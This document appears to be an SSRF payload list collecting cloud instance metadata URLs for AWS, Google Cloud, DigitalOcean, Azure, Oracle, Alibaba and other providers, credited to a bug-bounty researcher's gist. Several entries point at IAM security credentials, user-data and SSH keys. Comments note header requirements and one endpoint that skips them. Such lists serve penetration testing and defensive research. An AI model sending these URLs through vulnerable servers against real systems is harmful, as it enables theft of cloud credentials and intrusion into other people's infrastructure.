### Taken from haddix's repo https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b
## AWS
# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

# AWS - Dirs 

http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/public-keys/

## Google Cloud
#  https://cloud.google.com/compute/docs/metadata
#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

## Google
#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

http://metadata.google.internal/computeMetadata/v1beta1/

## Digital Ocean
# https://developers.digitalocean.com/documentation/metadata/

http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

## Packetcloud

https://metadata.packet.net/userdata

## Azure
#  Limited, maybe more exist?
# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance

## Update Apr 2017, Azure has more support; requires the header "Metadata: true"
# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

## OpenStack/RackSpace 
# (header required? unknown)
http://169.254.169.254/openstack

## HP Helion 
# (header required? unknown)
http://169.254.169.254/2009-04-04/meta-data/ 

## Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

## Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
